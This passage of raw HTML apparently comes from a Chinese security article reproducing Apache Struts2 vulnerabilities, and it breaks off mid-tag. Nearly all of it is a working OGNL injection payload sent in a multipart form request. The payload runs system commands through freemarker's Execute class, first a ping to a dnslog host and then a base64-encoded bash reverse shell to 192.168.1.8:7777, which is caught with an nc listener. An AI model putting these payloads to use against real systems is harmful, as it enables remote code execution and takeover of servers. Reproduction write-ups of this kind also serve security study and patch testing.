style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"java.util.HashSet"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">put</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"excludedClasses"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">emptyset</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">put</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"excludedPackageNames"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">emptyset</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">arglist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"java.util.ArrayList"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">arglist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">add</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"ping 9vll55.dnslog.cn"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">execute</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"freemarker.template.utility.Execute"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">execute</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">arglist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">))}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">------</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">--</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.66728280961183" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/75_5GztiaMC0yicp3cmYicVfO7kpCHLTA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wWcDmAdGcSwaYQ51wLHzjWKAkqEb5GztiaMC0yicp3cmYicVfO7kpCHLTA/640?wx_fmt=png'" data-type="png" data-w="1082" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">bash反弹命令需要先进行编码，同之前操作</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bash </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">i </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;&amp;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dev</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tcp</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1.8</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">7777</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;&amp;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3898477157360406" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/76_TiabzwBicaWT6nsiafdypynIZaIKOg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wTBCZhxzsT3LXIBbNmicmjhsk2IFcTiabzwBicaWT6nsiafdypynIZaIKOg/640?wx_fmt=png'" data-type="png" data-w="985" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bash </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">c </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">echo</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">YmFzaCAtaSA</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">JjE</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=}|{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">base64</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}|{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bash</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">i</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code></pre></section><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">------</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Content</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Disposition</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> form</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">data</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"id"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">application</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"org.apache.tomcat.InstanceManager"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">stack</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">attr</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"com.opensymphony.xwork2.util.ValueStack.ValueStack"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"org.apache.commons.collections.BeanMap"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setBean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">stack</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"context"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setBean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">macc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"memberAccess"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setBean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">macc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">emptyset</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"java.util.HashSet"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">put</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"excludedClasses"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">emptyset</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">put</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"excludedPackageNames"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">emptyset</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">arglist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"java.util.ArrayList"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">arglist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">add</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">execute</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"freemarker.template.utility.Execute"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">execute</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">arglist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">))}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">------</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">--</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">nc监听端口即可得到反弹shell</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6779808529155787" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/77_K5290aV9mm9wRY38rmBJAuAcsIopVw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wiaHrWEoltCIn9oXXHYHF4oia0nK5290aV9mm9wRY38rmBJAuAcsIopVw/640?wx_fmt=png'" data-type="png" data-w="1149" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__346" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(163, 163, 163)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" data-style="color: rgb(0, 0, 0);" class="js_darkmode__347" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(163, 163, 163)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" style="color: rgb(0, 0, 0);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)|rgb(0, 0, 0)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" 